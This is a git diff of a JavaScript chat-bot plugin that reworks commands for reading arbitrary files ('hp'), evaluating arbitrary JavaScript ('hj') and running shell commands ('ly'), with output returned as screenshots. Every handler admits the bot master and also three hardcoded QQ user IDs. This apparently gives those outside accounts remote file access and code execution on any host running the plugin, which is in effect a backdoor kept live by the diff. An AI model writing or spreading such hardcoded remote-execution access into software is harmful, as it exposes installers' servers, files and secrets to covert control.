@@ -59,17 +59,17 @@ export class File extends plugin {
           fnc: "List"
         },
         {
-          reg: "^hj.+",
-          fnc: "hjCommand"
-        },
-//以下指令借鉴的TRSS-Plugin的“远程命令”
-        {
           reg: "^hp.+",
           fnc: "hpCommand"
         },
+        //以下两个功能参考TRSS-Plugin的远程命令‘https://gitee.com/TimeRainStarSky/TRSS-Plugin’
         {
-          reg: "^hc.+",
-          fnc: "hcCommand"
+          reg: "^hj.+",
+          fnc: "JSPic"
+        },
+        {
+          reg: "^ly.+",
+          fnc: "ShellPic"
         }
       ]
     });
@@ -201,10 +201,10 @@ export class File extends plugin {
     await this.reply(fs.readdirSync(filePath).join("\n"), true);
   }
 
-  async hjCommand(e) {
+  async hpCommand(e) {
     if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
 
-    const msg = this.e.msg.replace("hj", "").trim();
+    const msg = this.e.msg.replace("hp", "").trim();
     logger.mark(`[File] 发送文件内容：${logger.blue(msg)}`);
 
     if (!fs.existsSync(msg) || !fs.statSync(msg).isFile()) {
@@ -216,79 +216,47 @@ export class File extends plugin {
     await this.reply(fileContent, true);
   }
 
-  async hpCommand(e) {
+  async JSPic(e) {
     if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
-    const cmd = this.e.msg.replace("hp", "").trim();
+    const cmd = this.e.msg.replace("hj", "").trim()
 
-    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`);
-    const ret = await this.evalSync(cmd, data => Bot.String(data));
-    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`);
+    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`)
+    const ret = await this.evalSync(cmd, data => Bot.Loging(data))
+    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`)
 
     if (!ret.stdout && !ret.error)
-      return this.reply("命令执行完成，没有返回值", true);
+      return this.reply("命令执行完成，没有返回值", true)
+
+    let Code = []
     if (ret.stdout)
-      await this.reply(ret.stdout, true);
+      Code.push(ret.stdout.trim())
     if (ret.error)
-      await this.reply(`错误输出：\n${ret.error.stack}`, true);
+      Code.push(`错误输出：\n${Bot.Loging(ret.error)}`)
+
+    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
+    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
+    return this.reply(img, true)
   }
 
-  async hpPic(e) {
+  async ShellPic(e) {
     if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
-    const cmd = this.e.msg.replace("hp", "").trim();
-    const ret = await Bot.exec(...prompt(cmd));
+    const cmd = this.e.msg.replace("ly", "").trim()
+    const ret = await Bot.exec(...prompt(cmd))
 
     if (!ret.stdout && !ret.stderr && !ret.error)
-      return this.reply("命令执行完成，没有返回值", true);
+      return this.reply("命令执行完成，没有返回值", true)
 
-    let Code = [];
+    let Code = []
     if (ret.stdout)
-      Code.push(ret.stdout.trim());
+      Code.push(ret.stdout.trim())
     if (ret.error)
-      Code.push(`远程命令错误：\n${Bot.Loging(ret.error)}`);
+      Code.push(`远程命令错误：\n${Bot.Loging(ret.error)}`)
     else if (ret.stderr)
-      Code.push(`标准错误输出：\n${ret.stderr.trim()}`);
+      Code.push(`标准错误输出：\n${ret.stderr.trim()}`)
 
-    Code = await ansi_up.ansi_to_html(Code.join("\n\n"));
-    Code = inspectCmd(hljs.highlight(cmd, { language: langCmd }).value, Code);
-    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code });
-    return this.reply(img, true);
-  }
-
-  async hcCommand(e) {
-    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
-    const cmd = this.e.msg.replace("hc", "").trim();
-
-    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`);
-    const ret = await this.evalSync(cmd, data => Bot.String(data));
-    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`);
-
-    if (!ret.stdout && !ret.error)
-      return this.reply("命令执行完成，没有返回值", true);
-    if (ret.stdout)
-      await this.reply(ret.stdout, true);
-    if (ret.error)
-      await this.reply(`错误输出：\n${ret.error.stack}`, true);
-  }
-
-  async hcPic(e) {
-    if (!(this.e.isMaster || this.e.user_id == 3610159055 || this.e.user_id == 2624367622 || this.e.user_id == 923276093)) return false;
-    const cmd = this.e.msg.replace("hc", "").trim();
-
-    logger.mark(`[远程命令] 执行Js：${logger.blue(cmd)}`);
-    const ret = await this.evalSync(cmd, data => Bot.Loging(data));
-    logger.mark(`[远程命令]\n${ret.stdout}\n${logger.red(ret.error?.stack)}`);
-
-    if (!ret.stdout && !ret.error)
-      return this.reply("命令执行完成，没有返回值", true);
-
-    let Code = [];
-    if (ret.stdout)
-      Code.push(ret.stdout.trim());
-    if (ret.error)
-      Code.push(`错误输出：\n${Bot.Loging(ret.error)}`);
-
-    Code = await ansi_up.ansi_to_html(Code.join("\n\n"));
-    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code });
-    return this.reply(img, true);
+    Code = await ansi_up.ansi_to_html(Code.join("\n\n"))
+    Code = inspectCmd(hljs.highlight(cmd, { language: langCmd }).value, Code)
+    const img = await puppeteer.screenshot("Code", { tplFile, htmlDir, Code })
+    return this.reply(img, true)
   }
 }
